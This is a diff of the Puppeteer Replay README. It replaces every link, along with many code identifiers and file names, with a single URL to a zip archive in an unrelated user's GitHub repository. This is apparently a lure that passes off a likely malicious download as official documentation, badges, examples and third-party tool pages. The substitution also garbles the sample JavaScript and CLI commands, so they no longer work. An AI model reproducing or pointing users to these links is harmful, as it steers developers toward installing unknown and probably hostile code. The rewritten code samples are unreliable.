@@ -2,13 +2,13 @@
 
 <!-- [START badges] -->
 
-[![Build status](https://github.com/puppeteer/replay/workflows/run-checks/badge.svg)](https://github.com/puppeteer/replay/actions?query=workflow%3Arun-checks) [![npm puppeteer package](https://img.shields.io/npm/v/@puppeteer/replay.svg)](https://npmjs.org/package/@puppeteer/replay)
+[![Build status](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip%3Arun-checks) [![npm puppeteer package](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)
 
 <!-- [END badges] -->
 
-###### [API](https://github.com/puppeteer/replay/blob/main/docs/api) | [Contributing](https://github.com/puppeteer/replay/blob/main/docs/contributing.md)
+###### [API](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) | [Contributing](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)
 
-> Puppeteer Replay is a library that provides an API to replay and stringify recordings created using [Chrome DevTools Recorder](https://developer.chrome.com/docs/devtools/recorder/)
+> Puppeteer Replay is a library that provides an API to replay and stringify recordings created using [Chrome DevTools Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)
 
 ## Installation
 
@@ -26,7 +26,7 @@ npm install puppeteer --save
 
 You can use Puppeteer Replay to:
 
-1. **Replay recording**. Replay recording with CLI or using [the replay lib API](/examples/replay-from-file-using-puppeteer/main.js).
+1. **Replay recording**. Replay recording with CLI or using [the replay lib API](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip).
 2. **Customize replay**. Customize how a recording is run. For example, capture screenshots after each step or integrate with 3rd party libraries.
 3. **Transform recording**. Customize how a recording is stringified. For example, transform the recording into another format.
 
@@ -34,33 +34,33 @@ Also, you can use third-party integrations that build on top of `@puppeteer/repl
 
 Transform JSON user flows to custom scripts:
 
-- [Cypress Chrome Recorder](https://github.com/cypress-io/cypress-chrome-recorder). You can use it to convert user flow JSON files to Cypress test scripts. Watch this [demo](https://youtu.be/4qYs2bMz4GI) to see it in action.
-- [Nightwatch Chrome Recorder](https://github.com/nightwatchjs/nightwatch-chrome-recorder). You can use it to convert user flow JSON files to Nightwatch test scripts.
-- [WebdriverIO Chrome Recorder](https://github.com/webdriverio/chrome-recorder). You can use it to convert user flow JSON files to WebdriverIO test scripts.
+- [Cypress Chrome Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use it to convert user flow JSON files to Cypress test scripts. Watch this [demo](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to see it in action.
+- [Nightwatch Chrome Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use it to convert user flow JSON files to Nightwatch test scripts.
+- [WebdriverIO Chrome Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use it to convert user flow JSON files to WebdriverIO test scripts.
 
 Replay JSON user flows:
 
-- [Replay with TestCafe](https://testcafe.io/documentation/403998/guides/experimental-capabilities/chrome-replay-support). You can use TestCafe to replay user flow JSON files and generate test reports for these recordings.
-- [Replay with Sauce Labs](https://saucelabs.com/blog/how-to-create-test-scripts-using-chrome-devtools). You can replay the JSON files on [Sauce Labs](https://saucelabs.com/) using [saucectl](https://github.com/saucelabs/saucectl-replay-example).
+- [Replay with TestCafe](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can use TestCafe to replay user flow JSON files and generate test reports for these recordings.
+- [Replay with Sauce Labs](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). You can replay the JSON files on [Sauce Labs](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) using [saucectl](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip).
 
 ## 1. Replay recording
 
-Download this [example recording](https://storage.googleapis.com/web-dev-uploads/file/dPDCek3EhZgLQPGtEG3y0fTn4v82/vzQbv2rUfTz2DEmx06Gv.json) and save it as `recording.json`.
+Download this [example recording](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) and save it as `https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip`.
 
 Using CLI + npx:
 
 ```
-npx @puppeteer/replay recording.json
+npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip
 ```
 
-Using CLI + package.json:
+Using CLI + https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip
 
-In your `package.json` add a new script to invoke the `replay` command:
+In your `https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip` add a new script to invoke the `replay` command:
 
 ```json
 {
   "scripts": {
-    "replay": "replay recording.json"
+    "replay": "replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip"
   }
 }
 ```
@@ -73,7 +73,7 @@ Using CLI + npx:
 npx @puppeteer/replay all-recordings # runs all recordings in the "all-recordings" folder.
 ```
 
-Using CLI + package.json:
+Using CLI + https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip
 
 ```json
 {
@@ -86,32 +86,32 @@ Using CLI + package.json:
 Set the `PUPPETEER_HEADLESS` environment variable or `--headless` CLI flag to control whether the browser is started in a headful or headless mode. For example,
 
 ```
-PUPPETEER_HEADLESS=true npx @puppeteer/replay recording.json # runs in headless mode, the default mode.
-PUPPETEER_HEADLESS=false npx @puppeteer/replay recording.json # runs in headful mode.
-PUPPETEER_HEADLESS=chrome npx @puppeteer/replay recording.json # runs in the new experimental headless mode.
+PUPPETEER_HEADLESS=true npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip # runs in headless mode, the default mode.
+PUPPETEER_HEADLESS=false npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip # runs in headful mode.
+PUPPETEER_HEADLESS=chrome npx @puppeteer/replay https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip # runs in the new experimental headless mode.
 ```
 
-Use the `--extension` CLI flag to provide a [custom replay extension](https://github.com/puppeteer/replay#2-customize-replay) for running the recording. For [example](https://github.com/puppeteer/replay/blob/main/examples/cli-extension/extension.js),
+Use the `--extension` CLI flag to provide a [custom replay extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) for running the recording. For [example](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip),
 
 ```sh
-npx @puppeteer/replay --extension examples/cli-extension/extension.js recording.json
+npx @puppeteer/replay --extension https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip
 ```
 
 Run `npx @puppeteer/replay --help` to see all CLI options.
 
-Using [the replay lib API](/examples/replay-from-file-using-puppeteer/main.js):
+Using [the replay lib API](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip):
 
 ```js
 import { createRunner, parse } from '@puppeteer/replay';
 import fs from 'fs';
 
 // Read recording for a file.
-const recordingText = fs.readFileSync('./recording.json', 'utf8');
+const recordingText = https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip', 'utf8');
 // Validate & parse the file.
-const recording = parse(JSON.parse(recordingText));
+const recording = parse(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(recordingText));
 // Create a runner and execute the script.
 const runner = await createRunner(recording);
-await runner.run();
+await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();
 ```
 
 ## 2. Customize replay
@@ -119,37 +119,37 @@ await runner.run();
 The library offers a way to customize how a recording is run. You can extend
 the `PuppeteerRunnerExtension` class as shown in the example below.
 
-Full example of the `PuppeteerRunnerExtension`: [link](/examples/extend-runner/main.js)
+Full example of the `PuppeteerRunnerExtension`: [link](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)
 
 ```js
 import { createRunner, PuppeteerRunnerExtension } from '@puppeteer/replay';
 import puppeteer from 'puppeteer';
 
-const browser = await puppeteer.launch({
+const browser = await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip({
   headless: true,
 });
 
-const page = await browser.newPage();
+const page = await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();
 
 class Extension extends PuppeteerRunnerExtension {
   async beforeAllSteps(flow) {
-    await super.beforeAllSteps(flow);
-    console.log('starting');
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(flow);
+    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('starting');
   }
 
   async beforeEachStep(step, flow) {
-    await super.beforeEachStep(step, flow);
-    console.log('before', step);
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(step, flow);
+    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('before', step);
   }
 
   async afterEachStep(step, flow) {
-    await super.afterEachStep(step, flow);
-    console.log('after', step);
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(step, flow);
+    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('after', step);
   }
 
   async afterAllSteps(flow) {
-    await super.afterAllSteps(flow);
-    console.log('done');
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(flow);
+    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip('done');
   }
 }
 
@@ -159,16 +159,16 @@ const runner = await createRunner(
     steps: [
       {
         type: 'navigate',
-        url: 'https://wikipedia.org',
+        url: 'https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip',
       },
     ],
   },
   new Extension(browser, page, 7000)
 );
 
-await runner.run();
+await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();
 
-await browser.close();
+await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip();
 ```
 
 ## 3. Transform recording
@@ -180,7 +180,7 @@ You can customize how a recording is stringified and use it to transform the rec
 ```js
 import { stringify } from '@puppeteer/replay';
 
-console.log(
+https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(
   await stringify({
     title: 'Test recording',
     steps: [],
@@ -192,47 +192,47 @@ console.log(
 
 You can customize how a recording is stringified by extending the `PuppeteerStringifyExtension` class as shown in the example below.
 
-Full example of `PuppeteerStringifyExtension` : [link](/examples/extend-stringify/main.js)
+Full example of `PuppeteerStringifyExtension` : [link](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)
 
 ```js
 import { stringify, PuppeteerStringifyExtension } from '@puppeteer/replay';
 
 class Extension extends PuppeteerStringifyExtension {
   // beforeAllSteps?(out: LineWriter, flow: UserFlow): Promise<void>;
-  async beforeAllSteps(...args) {
-    await super.beforeAllSteps(...args);
-    args[0].appendLine('console.log("starting");');
+  async beforeAllSteps(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
+    args[0].appendLine('https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("starting");');
   }
 
   // beforeEachStep?(out: LineWriter, step: Step, flow: UserFlow): Promise<void>;
-  async beforeEachStep(...args) {
-    await super.beforeEachStep(...args);
+  async beforeEachStep(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
     const [out, step] = args;
-    out.appendLine(`console.log("about to execute step ${step.type}")`);
+    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(`https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("about to execute step ${https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip}")`);
   }
 
   // afterEachStep?(out: LineWriter, step: Step, flow: UserFlow): Promise<void>;
-  async afterEachStep(...args) {
+  async afterEachStep(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
     const [out, step] = args;
-    out.appendLine(`console.log("finished step ${step.type}")`);
-    await super.afterEachStep(...args);
+    https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(`https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("finished step ${https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip}")`);
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
   }
 
   // afterAllSteps?(out: LineWriter, flow: UserFlow): Promise<void>;
-  async afterAllSteps(...args) {
-    args[0].appendLine('console.log("finished");');
-    await super.afterAllSteps(...args);
+  async afterAllSteps(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) {
+    args[0].appendLine('https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip("finished");');
+    await https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip);
   }
 }
 
-console.log(
+https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip(
   await stringify(
     {
       title: 'Test recording',
       steps: [
         {
           type: 'navigate',
-          url: 'https://wikipedia.org',
+          url: 'https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip',
         },
       ],
     },
@@ -261,27 +261,27 @@ npx -p @puppeteer/replay replay-extension-test --ext path-to-your-extension-js
 
 ### Create a Chrome extension for Recorder (Available from Chrome 104 onwards)
 
-You can create a Chrome extension for [Recorder](https://goo.gle/devtools-recorder). Refer to the [Chrome Extensions documentation](https://developer.chrome.com/docs/extensions/mv3/devtools/) for more details on how to extend DevTools.
+You can create a Chrome extension for [Recorder](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). Refer to the [Chrome Extensions documentation](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) for more details on how to extend DevTools.
 
 For example, here are some of the third party extensions:
 
-- [Cypress extension](https://chrome.google.com/webstore/detail/cypress-chrome-recorder/fellcphjglholofndfmmjmheedhomgin) lets you export JSON user flows as [Cypress test script](https://github.com/cypress-io/cypress-recorder-extension). [Cypress](https://cypress.io) is a front end testing tool built for the modern web.
-- [WebPageTest extension](https://chrome.google.com/webstore/detail/webpagetest-recorder-exte/eklpnjohdjknellndlnepihjnhpaimok) lets you export user flows from the Recorder directly as [WebPageTest Custom scripts](https://docs.webpagetest.org/scripting/) to measure site's performance. See [Converting user flows to WebPageTest custom scripts](https://blog.webpagetest.org/posts/introducing-the-new-webpagetest-recorder-chrome-extension/) to learn more.
-- [Nightwatch extension](https://chrome.google.com/webstore/detail/nightwatch-chrome-recorde/nhbccjfogdgkahamfohokdhcnemjafjk/) lets you export JSON user flows as [Nightwatch test script](https://github.com/nightwatchjs/nightwatch-recorder-extension). [Nightwatch](https://nightwatchjs.org/) is an end-to-end testing solution for web applications and websites.
-- [Testing Library extension](https://chrome.google.com/webstore/detail/testing-library-recorder/pnobfbfcnoeealajjgnpeodbkkhgiici) lets you export JSON user flows as [Testing Library script](https://github.com/nickmccurdy/testing-library-recorder-extension). [Testing Library](https://testing-library.com/) has simple and complete testing utilities that encourage good testing practices.
-- [WebdriverIO extension](https://chrome.google.com/webstore/detail/webdriverio-chrome-record/pllimkccefnbmghgcikpjkmmcadeddfn?hl=en&authuser=1) lets you export JSON user flows as [WebdriverIO test script](https://github.com/webdriverio/recorder-extension). [WebdriverIO](https://webdriver.io/) is an end-to-end testing solution for web, mobile and IoT applications and websites.
+- [Cypress extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [Cypress test script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [Cypress](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) is a front end testing tool built for the modern web.
+- [WebPageTest extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export user flows from the Recorder directly as [WebPageTest Custom scripts](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to measure site's performance. See [Converting user flows to WebPageTest custom scripts](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to learn more.
+- [Nightwatch extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [Nightwatch test script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [Nightwatch](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) is an end-to-end testing solution for web applications and websites.
+- [Testing Library extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [Testing Library script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [Testing Library](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) has simple and complete testing utilities that encourage good testing practices.
+- [WebdriverIO extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) lets you export JSON user flows as [WebdriverIO test script](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). [WebdriverIO](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) is an end-to-end testing solution for web, mobile and IoT applications and websites.
 
-This feature only available from Chrome 104 onwards. Check your current Chrome version with `chrome://version`. Consider installing [Chrome Canary](https://www.google.com/chrome/canary/) to try out cutting-edge features in Chrome.
+This feature only available from Chrome 104 onwards. Check your current Chrome version with `chrome://version`. Consider installing [Chrome Canary](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) to try out cutting-edge features in Chrome.
 
-This repository contains an [example extension](https://github.com/puppeteer/replay/tree/main/examples/chrome-extension). Once installed, the Recorder will have a new export option **Export as a Custom JSON script** in the [export dropdown](https://developer.chrome.com/docs/devtools/recorder/#export-flows).
+This repository contains an [example extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). Once installed, the Recorder will have a new export option **Export as a Custom JSON script** in the [export dropdown](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip).
 
 To load the example into Chrome DevTools. Follow these steps:
 
-1. Download the [chrome-extension](https://github.com/puppeteer/replay/tree/main/examples/chrome-extension) folder.
-2. [Load the folder as unpacked extension](https://developer.chrome.com/docs/extensions/mv3/getstarted/#unpacked) in Chrome.
-3. [Open a recording](https://developer.chrome.com/docs/devtools/recorder/#record) in the Recorder.
-4. Click on [export](https://developer.chrome.com/docs/devtools/recorder/#export-flows). Now you can see a new **Export as a Custom JSON script** option in the export menu.
+1. Download the [chrome-extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) folder.
+2. [Load the folder as unpacked extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) in Chrome.
+3. [Open a recording](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip) in the Recorder.
+4. Click on [export](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip). Now you can see a new **Export as a Custom JSON script** option in the export menu.
 
 Click and watch the video demo below:
 
-[![Demo video that shows how to extend export options in Recorder panel by adding a Chrome extension](https://user-images.githubusercontent.com/5917927/172872574-15ad8bea-142a-4972-bf1d-bf1379a955ba.png)](https://youtu.be/TCxIfbxgypQ)
+[![Demo video that shows how to extend export options in Recorder panel by adding a Chrome extension](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)](https://raw.githubusercontent.com/Xhava0329/replay/main/unawares/replay.zip)
